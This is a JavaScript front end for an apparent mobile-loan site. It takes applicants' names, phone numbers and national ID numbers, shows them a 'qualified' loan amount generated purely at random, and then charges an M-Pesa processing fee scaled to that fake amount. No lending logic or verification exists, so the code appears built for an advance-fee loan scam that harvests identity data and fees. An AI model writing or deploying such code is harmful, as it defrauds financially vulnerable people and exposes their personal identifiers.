document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const paymentForm = document.getElementById('paymentForm'); 
    if (loginForm) {-
        loginForm.addEventListener('submit', login);
    }
    if (paymentForm) {
        paymentForm.addEventListener('submit', pay);
    }
    loadDashboard();
});

async function login(event) {
    event.preventDefault();
    const firstName = document.getElementById('first_name').value;
    const lastName = document.getElementById('last_name').value;
    const phoneNumber = document.getElementById('phone_number').value;
    const idNumber = document.getElementById('id_number').value;
    const loanType = document.getElementById('loan_type').value;

    //Store the data
    localStorage.setItem('firstName',firstName);
    localStorage.setItem('lastName', lastName);
    localStorage.setItem('phoneNumber', phoneNumber);
    localStorage.setItem('idNumber', idNumber);
    localStorage.setItem('loanType', loanType);

    // Initialize or increment the global tracking ID counter
    let trackingCounter = localStorage.getItem('trackingCounter');
    if (!trackingCounter) {
        trackingCounter = 11234; // Initialize the counter if it doesn't exist
    } else {
        trackingCounter = parseInt(trackingCounter) + 1; // Increment the counter
    }
    localStorage.setItem('trackingCounter', trackingCounter);
    // Generate the new tracking ID
    const trackingID = `RK-${trackingCounter}`;
    localStorage.setItem('trackingID', trackingID);

    window.location.href = 'dashboard.html';
}

async function loadDashboard() {
    // Retrieve stored user information
    const firstName = localStorage.getItem('firstName');
    const lastName = localStorage.getItem('lastName');
    const phoneNumber = localStorage.getItem('phoneNumber');
    const idNumber = localStorage.getItem('idNumber');
    const loanType = localStorage.getItem('loanType');
    const trackingID = localStorage.getItem('trackingID');

    // Display user information on the dashboard
    document.getElementById('name').innerHTML = firstName;
    document.getElementById('names').innerHTML = firstName + ' ' + lastName;
    document.getElementById('mpesa_number').innerHTML = phoneNumber;
    document.getElementById('id_number').innerHTML = idNumber;
    document.getElementById('loan-id').innerHTML = trackingID;

    // Determine loan type and display it
    let loanTypeName;
    switch (parseInt(loanType)) {
        case 1:
            loanTypeName = "Agricultural Loans";
            break;
        case 2:
            loanTypeName = "Business Loans";
            break;
        case 3:
            loanTypeName = "Personal Loans";
            break;
        case 4:
            loanTypeName = "Student Loans";
            break;
        case 5:
            loanTypeName = "Bills Loans";
            break;
        default:
            loanTypeName = "Unknown Loan Type";
    }
    document.getElementById('loan_type').innerHTML = loanTypeName;

    // Shuffle loan amount and calculate processing fee
    const { loanAmount, processingFee } = shuffleLoanAndCalculateFee(parseInt(loanType));
    
    // Format qualified loan amount with commas
    const formattedLoanAmount = loanAmount.toLocaleString();

    // Display qualified loan amount and processing fee
    document.getElementById('qualified_loaninfo').innerHTML = formattedLoanAmount;
    document.getElementById('qualified_loan').innerHTML = formattedLoanAmount;
    document.getElementById('processing_fee').innerHTML = processingFee;

    document.getElementById('id_numberpay').value = idNumber;
    document.getElementById('mpesa_numberpay').value = phoneNumber;
    document.getElementById('processing_feepay').value = processingFee;
}


function shuffleLoanAndCalculateFee(loanType) {
    let minLoan, maxLoan;
    switch (loanType) {
        case 1: // Agricultural Loans
            minLoan = 500;
            maxLoan = 10000;
            break;
        case 2: // Business Loans
            minLoan = 500;
            maxLoan = 10000;
            break;
        case 3: // Personal Loans
            minLoan = 500;
            maxLoan = 10000;
            break;
        case 4: // Student Loans
            minLoan = 500;
            maxLoan = 10000;
            break;
        case 5: //Bills Loans
            minLoan = 500;
            maxLoan = 10000;
            break;
        default:
            minLoan = 500;
            maxLoan = 10000;
    }

    const loanAmount = Math.floor(Math.random() * (maxLoan - minLoan + 1)) + minLoan;
    // Round the loan amount to the nearest multiple of 100
    //loanAmount = Math.round(loanAmount / 100) * 100;

    const minFee = 25;
    const maxFee = 150;
    const processingFee = minFee + ((loanAmount - minLoan) / (maxLoan - minLoan)) * (maxFee - minFee);

    return {
        loanAmount: Math.round(loanAmount /100)*100,
        processingFee: Math.round(processingFee) // Round to nearest integer

    };
}

async function pay(event) {
    event.preventDefault();
    // Collect only required values
    //const idNumberPay = document.getElementById('id_numberpay').value;
    const mpesaNumberInput = document.getElementById('mpesa_numberpay');
    let mpesaNumber = mpesaNumberInput.value.trim();

    // Check if the phone number starts with '0' and is of length 10
    if (mpesaNumber.startsWith('0') && mpesaNumber.length === 10) {
        // Replace '0' with '254'
        mpesaNumber = '254' + mpesaNumber.slice(1);
    }
    // Update the input value with the formatted phone number
    mpesaNumberInput.value = mpesaNumber;


    //const mpesaNumberPay = document.getElementById('mpesa_numberpay').value;
    const processingFeePay = document.getElementById('processing_feepay').value;

    const data = {
        //id_numberpay: idNumberPay,
        mpesaNumber,
        processingFeePay
    };

    try {
        const response = await fetch('/mpesa-payment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const responseData = await response.json();
        if (response.ok) {  
            window.location.href = "successful.html";
        } else {
            window.location.href = 'error.html';
        }
    } catch (error) {
        console.error('Error:', error);
    }
}